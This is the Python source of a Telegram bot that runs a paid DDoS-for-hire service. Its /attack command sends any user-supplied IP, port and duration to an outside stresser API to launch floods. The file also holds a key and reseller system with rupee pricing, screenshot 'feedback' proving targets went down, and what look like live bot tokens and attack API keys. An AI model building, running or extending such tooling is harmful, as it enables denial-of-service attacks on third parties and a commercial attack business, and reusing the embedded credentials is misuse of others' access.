#!/usr/bin/env python3
import telebot,threading,time,os,json,secrets,requests
from datetime import datetime

BOT_TOKEN="8999988004:AAGkERza3dAi2Lu-Vnqox5vj5t1b2-NeTB4"
OWNER_IDS=[7944283616]
OWNER_USERNAMES=[""]
MAX_ATTACK=300
CONCURRENT=2
SERVER_TOTAL=1
API_BASE_URL="https://retrostress.net/api/start?"
ATTACK_API_KEY="4413d7a833f10528cd9d64c722a6da74f474f50508c077846f93797c4a278571"
REQUIRED_CHANNEL="https://t.me/+h6mk8RX6XEJkZDU9"

bot=telebot.TeleBot(BOT_TOKEN)
def load(f,d={}): return d if not os.path.exists(f) else json.load(open(f))
def save(f,d): json.dump(d,open(f,'w'))

for f in ["approved_groups.json","codes.json","users.json","banned.json","resellers.json","cooldown.json","user_attack_count.json","channel_verified.json","group_settings.json","pending_feedback.json","feedback_enabled.json","user_cooldowns.json","user_max_times.json","blocked_resellers.json"]:
    exec(f"{f.replace('.json','')}=load('{f}',{{}})")
st=load("settings.json",{"max_duration":MAX_ATTACK,"cooldown":60,"blocked_ports":[22,23,3389],"blocked_ips":[],"global_cooldown":0,"channel_verify_enabled":True})
bp,bi=st.get("blocked_ports",[22,23,3389]),st.get("blocked_ips",[])
active,pending,attack_count,start_time={},{},0,time.time()
bot_enabled=True
maintenance_mode=False
maintenance_msg=""

def is_owner(uid): return uid in OWNER_IDS
def is_reseller(uid): return str(uid) in resellers and str(uid) not in blocked_resellers
def is_approved(cid): return str(cid) in approved_groups
def approve(cid): approved_groups[str(cid)]=True; save("approved_groups.json",approved_groups)
def revoke(cid): 
    if str(cid) in approved_groups: del approved_groups[str(cid)]; save("approved_groups.json",approved_groups)
def is_banned(uid): return str(uid) in banned and banned[str(uid)].get('expires',0)>time.time()
def ban(uid,reason="",dur=86400): banned[str(uid)]={"reason":reason,"expires":time.time()+dur}; save("banned.json",banned)
def unban(uid):
    if str(uid) in banned: del banned[str(uid)]; save("banned.json",banned)
def has_key(uid):
    for k,d in codes.items():
        if uid in [u['user_id'] if isinstance(u,dict) else u for u in d.get("used_by",[])] and d.get("expires",0)>time.time(): return True
    return False
def use_key(uid,key):
    if key in codes:
        kd=codes[key]
        if not kd.get("activated_at"):
            sec=parse_time(kd.get("time_str","1d"))
            kd["expires"]=time.time()+sec
            kd["activated_at"]=time.time()
            save("codes.json",codes)
        if kd.get("used",0)<kd.get("max_users",1) and kd.get("expires",0)>time.time():
            if "used_by" not in kd: kd["used_by"]=[]
            if uid not in [u['user_id'] if isinstance(u,dict) else u for u in kd["used_by"]]:
                kd["used_by"].append({"user_id":uid,"username":None,"redeemed_at":time.time()})
                kd["used"]=kd.get("used",0)+1
                save("codes.json",codes); return True
    return False
def check_port(p): return p not in bp
def check_ip(i): return i not in bi
def active_count(): return len([a for a in active.values() if a.get('end',0)>time.time()])
def uptime(): s=int(time.time()-start_time); return f"{s//3600}h {(s%3600)//60}m {s%60}s"
def server_status():
    ac=active_count()
    return [f"🖥️ S{i}: {'🟡' if i<=ac else '🟢'}" for i in range(1,SERVER_TOTAL+1)],ac
def parse_time(t):
    t=t.lower().strip()
    if t.endswith('min'): return int(float(t[:-3])*60)
    if t.endswith('hr'): return int(float(t[:-2])*3600)
    if t.endswith('h'): return int(float(t[:-1])*3600)
    if t.endswith('d'): return int(float(t[:-1])*86400)
    if t.endswith('m'): return int(float(t[:-1])*60)
    if t.endswith('s'): return int(float(t[:-1]))
    try: return int(float(t)*3600)
    except: return 86400
def format_time(sec):
    if sec>=86400: return f"{sec//86400}d"
    if sec>=3600: return f"{sec//3600}h"
    if sec>=60: return f"{sec//60}m"
    return f"{sec}s"
def check_cd(uid):
    if is_owner(uid): return False,0
    gc=st.get("global_cooldown",0)
    if gc>0 and time.time()-cooldown.get(f"g_{uid}",0)<gc: return True,int(gc-(time.time()-cooldown.get(f"g_{uid}",0)))
    uc=user_cooldowns.get(str(uid),0)
    if uc>0 and time.time()-cooldown.get(f"u_{uid}",0)<uc: return True,int(uc-(time.time()-cooldown.get(f"u_{uid}",0)))
    r=st.get("cooldown",60)-(time.time()-cooldown.get(str(uid),0))
    return (True,int(r)) if r>0 else (False,0)
def set_cd(uid):
    if not is_owner(uid): cooldown[str(uid)]=time.time(); save("cooldown.json",cooldown)
def get_gs(gid,k,default): return group_settings.get(str(gid),{}).get(k,default)
def is_feedback_enabled(): return feedback_enabled.get("enabled",True)
def is_channel_verify_enabled(): return st.get("channel_verify_enabled",True)
def save_pending_feedback(uid,gid,target): pending_feedback[f"{uid}_{gid}"]={"target":target,"ts":time.time()}; save("pending_feedback.json",pending_feedback)
def has_feedback_pending(uid,gid): return f"{uid}_{gid}" in pending_feedback
def clear_feedback(uid,gid):
    if f"{uid}_{gid}" in pending_feedback: del pending_feedback[f"{uid}_{gid}"]; save("pending_feedback.json",pending_feedback); return True
    return False
def channel_check(uid): 
    if not is_channel_verify_enabled(): return True
    return is_owner(uid) or str(uid) in channel_verified
def verify_channel(uid): channel_verified[str(uid)]=True; save("channel_verified.json",channel_verified)
def api_attack(ip,port,dur):
    try:
        r=requests.get(API_BASE_URL,params={"key":ATTACK_API_KEY,"target":ip,"port":port,"time":dur,"method":"STUN"},timeout=10)
        if r.status_code in [200,201,202]: return True,"Started"
        return False,f"Error {r.status_code}"
    except Exception as e: return False,str(e)

def update_timer(cid,mid,dur,ip,port,name,uid):
    for r in range(dur,-1,-1):
        if not bot_enabled or uid not in active: break
        if r>0:
            try: bot.edit_message_text(f"🔥🔥 ATTACK 🔥🔥\n👤 {name}\n🎯 {ip}:{port}\n⏱️ {r}s left",cid,mid)
            except: pass
        time.sleep(1)

def run_attack(cid,mid,uid,ip,port,dur,name,gid=None):
    global attack_count
    active[uid]={'target':f"{ip}:{port}",'end':time.time()+dur}
    threading.Thread(target=update_timer,args=(cid,mid,dur,ip,port,name,uid),daemon=True).start()
    s=time.time()
    ok,_=api_attack(ip,port,dur)
    time.sleep(max(0,dur-(time.time()-s)))
    if uid in active: del active[uid]
    if ok:
        attack_count+=1
        pending[uid]={'target':f"{ip}:{port}",'expires':time.time()+300}
        final=f"✅ ATTACK DONE!\n👤 {name}\n🎯 {ip}:{port}\n⏱️ {dur}s"
        try: bot.edit_message_text(final,cid,mid)
        except: bot.send_message(cid,final)
        if is_feedback_enabled() and not is_owner(uid) and get_gs(gid,'feedback',True):
            save_pending_feedback(uid,gid,f"{ip}:{port}")
            bot.send_message(cid,f"📸 PHOTO FEEDBACK NEEDED!\nSend screenshot of {ip}:{port}")
        bot.send_message(cid,f"✅ Attack on {ip}:{port} finished!")
    else:
        try: bot.edit_message_text(f"❌ FAILED!\n{ip}:{port}",cid,mid)
        except: bot.send_message(cid,f"❌ Failed: {ip}:{port}")

@bot.message_handler(content_types=['photo'])
def photo_feedback(m):
    uid=m.from_user.id; gid=m.chat.id if m.chat.type!='private' else None
    if f"{uid}_{gid}" in pending_feedback:
        t=pending_feedback[f"{uid}_{gid}"]['target']; clear_feedback(uid,gid)
        for o in OWNER_IDS:
            try: bot.send_photo(o,m.photo[-1].file_id,caption=f"📸 FEEDBACK\nUser: {uid}\nTarget: {t}")
            except: pass
        bot.reply_to(m,"✅ Screenshot received! Next attack allowed.")

@bot.message_handler(func=lambda m: has_feedback_pending(m.from_user.id, m.chat.id if m.chat.type!='private' else None) and m.text and not m.text.startswith('/'), content_types=['text'])
def block_text(m): bot.reply_to(m,"❌ Send PHOTO only!")

# ATTACK HANDLER
@bot.message_handler(commands=['attack'])
def attack_cmd(m):
    uid=m.from_user.id; cid=m.chat.id; ct=m.chat.type; name=m.from_user.username or m.from_user.first_name; gid=cid if ct!='private' else None
    p=m.text.split()
    
    if maintenance_mode and not is_owner(uid): return bot.reply_to(m,f"🔧 MAINTENANCE\n{maintenance_msg}")
    if not bot_enabled and not is_owner(uid): return bot.reply_to(m,"❌ Bot disabled!")
    if is_banned(uid) and not is_owner(uid): return bot.reply_to(m,"🚫 Banned!")
    
    if ct!='private' and not is_owner(uid):
        if not channel_check(uid): return bot.reply_to(m,f"❌ Join channel: /verify")
        if is_feedback_enabled() and get_gs(cid,'feedback',True) and has_feedback_pending(uid,cid): 
            return bot.reply_to(m,"❌ Send photo feedback first!")
    
    incd,rem=check_cd(uid)
    if incd: return bot.reply_to(m,f"⏳ Wait {rem}s")
    
    if not is_owner(uid):
        if ct=='private' and not has_key(uid): return bot.reply_to(m,"❌ /activate KEY")
        if ct!='private' and not is_approved(cid): return bot.reply_to(m,"❌ Group not approved!")
    
    if len(p)!=4: return bot.reply_to(m,"❌ /attack IP PORT TIME\nExample: /attack 1.2.3.4 80 60")
    
    try:
        ip,port,dur=p[1],int(p[2]),int(p[3])
        max_dur=get_gs(cid,'max_time',user_max_times.get(str(uid),st.get('max_duration',MAX_ATTACK)))
        if dur>max_dur: return bot.reply_to(m,f"❌ Max {max_dur}s")
        if dur<5: return bot.reply_to(m,"❌ Min 5s")
        if port<1 or port>65535: return bot.reply_to(m,"❌ Invalid port")
        if not check_port(port): return bot.reply_to(m,f"❌ Port {port} blocked")
        if not check_ip(ip): return bot.reply_to(m,f"❌ IP {ip} blocked")
    except: return bot.reply_to(m,"❌ Invalid input!")
    
    if ct!='private' and not is_owner(uid):
        lim=get_gs(cid,'personal_attack_limit',10)
        used=user_attack_count.get(f"{uid}_{cid}",0)
        if used>=lim: return bot.reply_to(m,f"❌ Limit {lim} reached! Contact owner")
        user_attack_count[f"{uid}_{cid}"]=used+1
        save("user_attack_count.json",user_attack_count)
    
    set_cd(uid)
    if st.get("global_cooldown",0)>0: 
        cooldown[f"g_{uid}"]=time.time()
        save("cooldown.json",cooldown)
    
    sv,_=server_status()
    msg=bot.reply_to(m,f"🔥 ATTACKING {ip}:{port} for {dur}s\n📡 {''.join(sv)}")
    threading.Thread(target=run_attack,args=(cid,msg.message_id,uid,ip,port,dur,name,cid if ct!='private' else None),daemon=True).start()

# ============ OWNER COMMANDS HANDLERS ============

@bot.message_handler(commands=['extendkey','extendallkey','keyusers','down','tban','add_reseller','remove_reseller','block_reseller','unblock_reseller','all_resellers','saldoadd','saldoremove','saldo','setgrp','broadcast','broadcastreseller','broadcastpaid','setcooldowngroup','setcooldownuser','setmaxtimeuser','setglobalcooldown','setmaxtimegroup','setmaxcongroup','setmaxtimeattackperpersongroup','setonofffeedback','ban','unban','addport','removeport','addip','removeip','approve','revoke','delkey','checkuser','resetcooldown','resetuserattack','status','running','screenshot','balance','setmax','setcooldown','addreseller','addbalance','resellers','on','off','groups','gen','keys','allkeys','delkeys','stats','stop','myapi','serverinfo','maintenance','ok','delexpkey','onoffchannelverify'])
def owner_commands(m):
    global bot_enabled, maintenance_mode, maintenance_msg
    uid=m.from_user.id; cid=m.chat.id; ct=m.chat.type; cmd=m.text.split()[0][1:]
    p=m.text.split()
    
    if not is_owner(uid) and cmd not in ['status','running','screenshot','balance']:
        return bot.reply_to(m,"❌ Owner only!")
    
    # /onoffchannelverify
    if cmd=='onoffchannelverify':
        if len(p)!=2 or p[1] not in ['on','off']:
            return bot.reply_to(m,"/onoffchannelverify on/off\nTurn channel verification ON or OFF")
        st["channel_verify_enabled"] = (p[1]=='on')
        save("settings.json",st)
        bot.reply_to(m,f"✅ Channel verification turned {p[1].upper()}")
    
    # /extendkey
    elif cmd=='extendkey':
        if len(p)!=3: return bot.reply_to(m,"/extendkey <key_or_user_id> <time>")
        target,time_str=p[1].upper(),p[2].lower()
        sec=parse_time(time_str)
        if target in codes and codes[target].get('expires',0)>time.time():
            codes[target]['expires']+=sec
            save("codes.json",codes)
            bot.reply_to(m,f"✅ Extended {target} +{time_str}")
        elif target.isdigit():
            found=False
            for key,kd in codes.items():
                for ui in kd.get('used_by',[]):
                    if (ui['user_id'] if isinstance(ui,dict) else ui)==int(target) and kd.get('expires',0)>time.time():
                        kd['expires']+=sec
                        save("codes.json",codes)
                        bot.reply_to(m,f"✅ Extended user {target}'s key ({key}) +{time_str}")
                        found=True
                        return
            if not found: bot.reply_to(m,"❌ No active key")
        else: bot.reply_to(m,"❌ Invalid")
    
    # /extendallkey
    elif cmd=='extendallkey':
        if len(p)!=2: return bot.reply_to(m,"/extendallkey <time>")
        sec=parse_time(p[1].lower()); c=0
        for k,d in codes.items():
            if d.get('expires',0)>time.time():
                d['expires']+=sec; c+=1
        save("codes.json",codes)
        bot.reply_to(m,f"✅ Extended {c} keys by {p[1]}")
    
    # /keyusers
    elif cmd=='keyusers':
        if len(p)!=2: return bot.reply_to(m,"/keyusers <key>")
        key=p[1].upper()
        if key not in codes: return bot.reply_to(m,"❌ Key not found")
        kd=codes[key]; used=kd.get('used_by',[]); exp=kd.get('expires',0)
        msg=f"🔑 {key}: {kd['name']}\n👥 {len(used)}/{kd['max_users']}\n📅 Expires: {datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S') if exp>0 else 'Not activated'}\n\n👤 USERS:\n"
        for i,u in enumerate(used,1):
            uid2=u['user_id'] if isinstance(u,dict) else u
            name=u.get('username',str(uid2)) if isinstance(u,dict) else str(u)
            redeemed=datetime.fromtimestamp(u['redeemed_at']).strftime('%Y-%m-%d %H:%M:%S') if isinstance(u,dict) and u.get('redeemed_at') else 'Unknown'
            msg+=f"{i}. ID: {uid2} | {name}\n   Redeemed: {redeemed}\n"
        bot.reply_to(m,msg[:4000])
    
    # /down
    elif cmd=='down':
        if len(p)!=3: return bot.reply_to(m,"/down <key_or_user_id> <time>")
        target,time_str=p[1].upper(),p[2].lower()
        sec=parse_time(time_str)
        if target in codes and codes[target].get('expires',0)>time.time():
            codes[target]['expires']=max(time.time()+60, codes[target]['expires']-sec)
            save("codes.json",codes)
            bot.reply_to(m,f"✅ Reduced {target} by {time_str}")
        else: bot.reply_to(m,"❌ Invalid")
    
    # /tban
    elif cmd=='tban':
        if len(p)<3: return bot.reply_to(m,"/tban <user_id> <time> [reason]")
        uid2=int(p[1]); sec=parse_time(p[2].lower()); reason=" ".join(p[3:]) if len(p)>3 else ""
        ban(uid2,reason,sec)
        bot.reply_to(m,f"✅ Temp banned {uid2} for {p[2]}")
    
    # /add_reseller
    elif cmd=='add_reseller':
        if len(p)!=2: return bot.reply_to(m,"/add_reseller <user_id>")
        if p[1] not in resellers: resellers[p[1]]={"balance":0,"keys_generated":0}
        if p[1] in blocked_resellers: del blocked_resellers[p[1]]
        save("resellers.json",resellers); save("blocked_resellers.json",blocked_resellers)
        bot.reply_to(m,f"✅ Reseller {p[1]} added")
    
    # /remove_reseller
    elif cmd=='remove_reseller':
        if len(p)!=2: return bot.reply_to(m,"/remove_reseller <user_id>")
        if p[1] in resellers: del resellers[p[1]]; save("resellers.json",resellers); bot.reply_to(m,f"✅ Removed {p[1]}")
        else: bot.reply_to(m,"❌ Not found")
    
    # /block_reseller
    elif cmd=='block_reseller':
        if len(p)!=2: return bot.reply_to(m,"/block_reseller <user_id>")
        blocked_resellers[p[1]]=True; save("blocked_resellers.json",blocked_resellers)
        bot.reply_to(m,f"✅ Blocked {p[1]}")
    
    # /unblock_reseller
    elif cmd=='unblock_reseller':
        if len(p)!=2: return bot.reply_to(m,"/unblock_reseller <user_id>")
        if p[1] in blocked_resellers: del blocked_resellers[p[1]]; save("blocked_resellers.json",blocked_resellers); bot.reply_to(m,f"✅ Unblocked {p[1]}")
        else: bot.reply_to(m,"❌ Not blocked")
    
    # /all_resellers
    elif cmd=='all_resellers':
        if not resellers: return bot.reply_to(m,"No resellers")
        msg="👥 ALL RESELLERS\n\n"
        for uid2,d in resellers.items():
            blocked="🔴 BLOCKED" if uid2 in blocked_resellers else "🟢 ACTIVE"
            msg+=f"ID: {uid2}\n💰 ₹{d['balance']} | 🔑 {d.get('keys_generated',0)}\n📊 {blocked}\n\n"
        bot.reply_to(m,msg[:4000])
    
    # /saldoadd
    elif cmd=='saldoadd':
        if len(p)!=3: return bot.reply_to(m,"/saldoadd <user_id> <amount>")
        if p[1] not in resellers: resellers[p[1]]={"balance":0,"keys_generated":0}
        resellers[p[1]]["balance"]+=int(p[2]); save("resellers.json",resellers)
        bot.reply_to(m,f"✅ Added ₹{p[2]} to {p[1]}\n💰 New: ₹{resellers[p[1]]['balance']}")
    
    # /saldoremove
    elif cmd=='saldoremove':
        if len(p)!=3: return bot.reply_to(m,"/saldoremove <user_id> <amount>")
        if p[1] not in resellers: return bot.reply_to(m,"Not found")
        resellers[p[1]]["balance"]=max(0, resellers[p[1]]["balance"]-int(p[2])); save("resellers.json",resellers)
        bot.reply_to(m,f"✅ Removed ₹{p[2]} from {p[1]}\n💰 New: ₹{resellers[p[1]]['balance']}")
    
    # /saldo
    elif cmd=='saldo':
        if len(p)!=2: return bot.reply_to(m,"/saldo <user_id>")
        if p[1] not in resellers: return bot.reply_to(m,"Not found")
        bot.reply_to(m,f"💰 {p[1]}: ₹{resellers[p[1]]['balance']}\n🔑 Keys: {resellers[p[1]].get('keys_generated',0)}")
    
    # /setgrp
    elif cmd=='setgrp':
        if len(p)!=4: return bot.reply_to(m,"/setgrp <group_id> <max_time/cooldown/max_slots/feedback> <value>")
        gid,setting,val=p[1],p[2].lower(),p[3]
        if gid not in group_settings: group_settings[gid]={}
        if setting=='max_time': group_settings[gid]['max_time']=int(val)
        elif setting=='cooldown': group_settings[gid]['cooldown']=int(val)
        elif setting=='max_slots': group_settings[gid]['max_slots']=int(val)
        elif setting=='feedback': group_settings[gid]['feedback']=val.lower()=='on'
        else: return bot.reply_to(m,"Settings: max_time, cooldown, max_slots, feedback")
        save("group_settings.json",group_settings)
        bot.reply_to(m,f"✅ Group {gid} {setting}={val}")
    
    # /broadcast
    elif cmd=='broadcast':
        msg=" ".join(p[1:])
        if not msg: return
        s=0
        for kd in codes.values():
            for ui in kd.get('used_by',[]):
                try: bot.send_message(ui['user_id'] if isinstance(ui,dict) else ui,f"📢 {msg}"); s+=1
                except: pass
        bot.reply_to(m,f"✅ Sent to {s} users")
    
    # /broadcastreseller
    elif cmd=='broadcastreseller':
        msg=" ".join(p[1:])
        if not msg: return
        s=0
        for uid2 in resellers:
            try: bot.send_message(int(uid2),f"📢 RESELLER\n{msg}"); s+=1
            except: pass
        bot.reply_to(m,f"✅ Sent to {s} resellers")
    
    # /broadcastpaid
    elif cmd=='broadcastpaid':
        msg=" ".join(p[1:])
        if not msg: return
        s=0
        for kd in codes.values():
            if kd.get('expires',0)>time.time():
                for ui in kd.get('used_by',[]):
                    try: bot.send_message(ui['user_id'] if isinstance(ui,dict) else ui,f"📢 PAID\n{msg}"); s+=1
                    except: pass
        bot.reply_to(m,f"✅ Sent to {s} paid users")
    
    # /setcooldowngroup
    elif cmd=='setcooldowngroup':
        if len(p)!=3: return bot.reply_to(m,"/setcooldowngroup <group_id> <seconds>")
        if p[1] not in group_settings: group_settings[p[1]]={}
        group_settings[p[1]]['cooldown']=int(p[2]); save("group_settings.json",group_settings)
        bot.reply_to(m,f"✅ Group {p[1]} cooldown={p[2]}s")
    
    # /setcooldownuser
    elif cmd=='setcooldownuser':
        if len(p)!=3: return bot.reply_to(m,"/setcooldownuser <user_id> <seconds>")
        user_cooldowns[p[1]]=int(p[2]); save("user_cooldowns.json",user_cooldowns)
        bot.reply_to(m,f"✅ User {p[1]} cooldown={p[2]}s")
    
    # /setmaxtimeuser
    elif cmd=='setmaxtimeuser':
        if len(p)!=3: return bot.reply_to(m,"/setmaxtimeuser <user_id> <seconds>")
        user_max_times[p[1]]=int(p[2]); save("user_max_times.json",user_max_times)
        bot.reply_to(m,f"✅ User {p[1]} max time={p[2]}s")
    
    # /setglobalcooldown
    elif cmd=='setglobalcooldown':
        if len(p)!=2: return bot.reply_to(m,"/setglobalcooldown <seconds>")
        st["global_cooldown"]=int(p[1]); save("settings.json",st)
        bot.reply_to(m,f"✅ Global cooldown={p[1]}s")
    
    # /setmaxtimegroup
    elif cmd=='setmaxtimegroup':
        if len(p)!=3: return bot.reply_to(m,"/setmaxtimegroup <group_id> <seconds>")
        if p[1] not in group_settings: group_settings[p[1]]={}
        group_settings[p[1]]['max_time']=int(p[2]); save("group_settings.json",group_settings)
        bot.reply_to(m,f"✅ Group {p[1]} max time={p[2]}s")
    
    # /setmaxcongroup
    elif cmd=='setmaxcongroup':
        if len(p)!=3: return bot.reply_to(m,"/setmaxcongroup <group_id> <count>")
        if p[1] not in group_settings: group_settings[p[1]]={}
        group_settings[p[1]]['max_slots']=int(p[2]); save("group_settings.json",group_settings)
        bot.reply_to(m,f"✅ Group {p[1]} max concurrent={p[2]}")
    
    # /setmaxtimeattackperpersongroup
    elif cmd=='setmaxtimeattackperpersongroup':
        if len(p)!=3: return bot.reply_to(m,"/setmaxtimeattackperpersongroup <group_id> <limit>")
        if p[1] not in group_settings: group_settings[p[1]]={}
        group_settings[p[1]]['personal_attack_limit']=int(p[2]); save("group_settings.json",group_settings)
        bot.reply_to(m,f"✅ Group {p[1]} per-person limit={p[2]}")
    
    # /setonofffeedback
    elif cmd=='setonofffeedback':
        if len(p)!=2 or p[1] not in ['on','off']: return bot.reply_to(m,"/setonofffeedback on/off")
        feedback_enabled["enabled"]=(p[1]=='on'); save("feedback_enabled.json",feedback_enabled)
        bot.reply_to(m,f"✅ Feedback {p[1].upper()}")
    
    # /ban
    elif cmd=='ban':
        if len(p)<2: return bot.reply_to(m,"/ban <user_id> [reason]")
        ban(int(p[1])," ".join(p[2:]) if len(p)>2 else "")
        bot.reply_to(m,f"✅ Banned {p[1]}")
    
    # /unban
    elif cmd=='unban':
        if len(p)!=2: return bot.reply_to(m,"/unban <user_id>")
        unban(int(p[1])); bot.reply_to(m,f"✅ Unbanned {p[1]}")
    
    # /addport
    elif cmd=='addport':
        if len(p)!=2: return bot.reply_to(m,"/addport <port>")
        port=int(p[1])
        if port not in bp: bp.append(port); st["blocked_ports"]=bp; save("settings.json",st)
        bot.reply_to(m,f"✅ Port {port} blocked")
    
    # /removeport
    elif cmd=='removeport':
        if len(p)!=2: return bot.reply_to(m,"/removeport <port>")
        port=int(p[1])
        if port in bp: bp.remove(port); st["blocked_ports"]=bp; save("settings.json",st)
        bot.reply_to(m,f"✅ Port {port} unblocked")
    
    # /addip
    elif cmd=='addip':
        if len(p)!=2: return bot.reply_to(m,"/addip <ip>")
        if p[1] not in bi: bi.append(p[1]); st["blocked_ips"]=bi; save("settings.json",st)
        bot.reply_to(m,f"✅ IP {p[1]} blocked")
    
    # /removeip
    elif cmd=='removeip':
        if len(p)!=2: return bot.reply_to(m,"/removeip <ip>")
        if p[1] in bi: bi.remove(p[1]); st["blocked_ips"]=bi; save("settings.json",st)
        bot.reply_to(m,f"✅ IP {p[1]} unblocked")
    
    # /approve
    elif cmd=='approve':
        if len(p)!=2: return bot.reply_to(m,"/approve <group_id>")
        approve(p[1]); bot.reply_to(m,f"✅ Group {p[1]} approved")
    
    # /revoke
    elif cmd=='revoke':
        if len(p)!=2: return bot.reply_to(m,"/revoke <group_id>")
        revoke(p[1]); bot.reply_to(m,f"❌ Group {p[1]} revoked")
    
    # /delkey
    elif cmd=='delkey':
        if len(p)!=2: return bot.reply_to(m,"/delkey <key>")
        if p[1].upper() in codes: del codes[p[1].upper()]; save("codes.json",codes); bot.reply_to(m,f"✅ Deleted {p[1]}")
        else: bot.reply_to(m,"❌ Not found")
    
    # /checkuser
    elif cmd=='checkuser':
        if len(p)!=2: return bot.reply_to(m,"/checkuser <user_id>")
        for k,d in codes.items():
            for ui in d.get('used_by',[]):
                if (ui['user_id'] if isinstance(ui,dict) else ui)==int(p[1]):
                    return bot.reply_to(m,f"User {p[1]}: Key {k} ({d['name']})\nExpires: {datetime.fromtimestamp(d['expires']).strftime('%Y-%m-%d %H:%M:%S') if d.get('expires') else 'Never'}")
        bot.reply_to(m,f"User {p[1]}: No active key")
    
    # /resetcooldown
    elif cmd=='resetcooldown':
        if len(p)!=2: return bot.reply_to(m,"/resetcooldown <user_id>")
        if p[1] in cooldown: del cooldown[p[1]]; save("cooldown.json",cooldown)
        bot.reply_to(m,f"✅ Reset cooldown for {p[1]}")
    
    # /resetuserattack
    elif cmd=='resetuserattack':
        if len(p)!=3: return bot.reply_to(m,"/resetuserattack <user_id> <group_id>")
        key=f"{p[1]}_{p[2]}"
        if key in user_attack_count: del user_attack_count[key]; save("user_attack_count.json",user_attack_count)
        bot.reply_to(m,f"✅ Reset attack limit for user {p[1]} in group {p[2]}")
    
    # /status
    elif cmd=='status':
        bot.reply_to(m,f"📊 Bot: {'ON' if bot_enabled else 'OFF'}\nActive: {active_count()}\nAttacks: {attack_count}\nFeedback: {'ON' if is_feedback_enabled() else 'OFF'}\nChannel Verify: {'ON' if is_channel_verify_enabled() else 'OFF'}")
    
    # /running
    elif cmd=='running':
        if not active: bot.reply_to(m,"No active attacks")
        else: bot.reply_to(m,"🔥 ACTIVE\n"+ "\n".join([f"{d['target']} - {int(d['end']-time.time())}s" for d in active.values()]))
    
    # /screenshot
    elif cmd=='screenshot':
        if uid not in pending: bot.reply_to(m,"No pending")
        elif time.time()>pending[uid]['expires']: del pending[uid]; bot.reply_to(m,"Expired")
        else: bot.reply_to(m,f"Send screenshot for {pending[uid]['target']}")
    
    # /balance
    elif cmd=='balance':
        if not is_reseller(str(uid)): bot.reply_to(m,"Not a reseller")
        else: bot.reply_to(m,f"💰 ₹{resellers[str(uid)]['balance']}\n🔑 {resellers[str(uid)].get('keys_generated',0)} keys")
    
    # /setmax
    elif cmd=='setmax':
        if len(p)!=2: return
        st["max_duration"]=int(p[1]); save("settings.json",st); bot.reply_to(m,f"✅ Max {p[1]}s")
    
    # /setcooldown
    elif cmd=='setcooldown':
        if len(p)!=2: return
        st["cooldown"]=int(p[1]); save("settings.json",st); bot.reply_to(m,f"✅ Cd {p[1]}s")
    
    # /addreseller
    elif cmd=='addreseller':
        if len(p)!=3: return
        resellers[p[1]]={"balance":int(p[2]),"keys_generated":0}; save("resellers.json",resellers); bot.reply_to(m,f"✅ Added {p[1]}")
    
    # /addbalance
    elif cmd=='addbalance':
        if len(p)!=3 or p[1] not in resellers: return
        resellers[p[1]]["balance"]+=int(p[2]); save("resellers.json",resellers); bot.reply_to(m,f"✅ +₹{p[2]}")
    
    # /resellers
    elif cmd=='resellers':
        if not resellers: bot.reply_to(m,"No resellers")
        else: bot.reply_to(m,"👥 RESELLERS\n"+ "\n".join([f"{i}: ₹{d['balance']}" for i,d in resellers.items()]))
    
    # /on
    elif cmd=='on':
        bot_enabled=True; bot.reply_to(m,"✅ ON")
    
    # /off
    elif cmd=='off':
        bot_enabled=False; bot.reply_to(m,"❌ OFF")
    
    # /groups
    elif cmd=='groups':
        bot.reply_to(m,"✅ GROUPS\n"+ "\n".join(approved_groups.keys()) if approved_groups else "None")
    
    # /gen
    elif cmd=='gen':
        if not is_owner(uid) and not is_reseller(uid): return bot.reply_to(m,"❌ No permission")
        if is_reseller(str(uid)) and str(uid) in blocked_resellers: return bot.reply_to(m,"❌ Blocked!")
        if len(p)<3: return bot.reply_to(m,"/gen <name> <time> [max]")
        name,time_str=p[1],p[2].lower()
        max_u=int(p[3]) if len(p)>3 else 1
        if is_reseller(uid):
            pricing={'30min':5,'1hr':10,'2hr':15,'5hr':25,'12hr':35,'1d':60,'3d':150,'7d':250}
            cost=pricing.get(time_str,10)
            if resellers[str(uid)]["balance"]<cost: return bot.reply_to(m,f"Insufficient! Need ₹{cost}")
            resellers[str(uid)]["balance"]-=cost
            resellers[str(uid)]["keys_generated"]=resellers[str(uid)].get("keys_generated",0)+1
            save("resellers.json",resellers)
        key=secrets.token_hex(8).upper()
        codes[key]={"name":name,"max_users":max_u,"used":0,"used_by":[],"expires":0,"time_str":time_str,"activated_at":None}
        save("codes.json",codes)
        bot.reply_to(m,f"✅ {key}\n📛 {name}\n👥 {max_u}\n⏱️ {time_str}")
        if is_reseller(uid):
            for o in OWNER_IDS:
                try: bot.send_message(o,f"📢 Reseller {uid} made {key}")
                except: pass
    
    # /keys
    elif cmd=='keys':
        msg="🔑 KEYS\n"+ "\n".join([f"{k}: {v['name']} ({len(v.get('used_by',[]))}/{v['max_users']})" for k,v in codes.items()])[:4000] if codes else "None"
        bot.reply_to(m,msg)
    
    # /allkeys
    elif cmd=='allkeys':
        msg="🔑 ALL KEYS\n"
        for k,v in codes.items():
            exp=v.get('expires',0)
            msg+=f"{k}: {v['name']} | {len(v.get('used_by',[]))}/{v['max_users']} | {'ACTIVE' if exp>time.time() else 'EXPIRED' if v.get('activated_at') else 'INACTIVE'}\n"
        bot.reply_to(m,msg[:4000])
    
    # /delkeys
    elif cmd=='delkeys':
        if len(p)==2 and p[1].lower()=='confirm':
            codes.clear(); save("codes.json",codes); bot.reply_to(m,"✅ All keys deleted")
        else: bot.reply_to(m,"⚠️ /delkeys confirm")
    
    # /stats
    elif cmd=='stats':
        total_used=sum(len(v.get('used_by',[])) for v in codes.values())
        bot.reply_to(m,f"📊 Uptime: {uptime()}\nUsers: {total_used}\nGroups: {len(approved_groups)}\nAttacks: {attack_count}\nResellers: {len(resellers)}\nKeys: {len(codes)}")
    
    # /stop
    elif cmd=='stop':
        active.clear(); bot.reply_to(m,"✅ Stopped")
    
    # /myapi
    elif cmd=='myapi':
        bot.reply_to(m,f"API: {API_BASE_URL}\nKey: {ATTACK_API_KEY}")
    
    # /serverinfo
    elif cmd=='serverinfo':
        sv,ac=server_status(); bot.reply_to(m,f"🖥️ Servers: {SERVER_TOTAL}\nActive: {ac}\n"+" ".join(sv))
    
    # /maintenance
    elif cmd=='maintenance':
        maintenance_mode=True
        maintenance_msg=" ".join(p[1:]) if len(p)>1 else "Under maintenance"
        bot.reply_to(m,f"🔧 MAINTENANCE ON\n{maintenance_msg}")
    
    # /ok
    elif cmd=='ok':
        maintenance_mode=False
        bot.reply_to(m,"✅ Maintenance OFF")
    
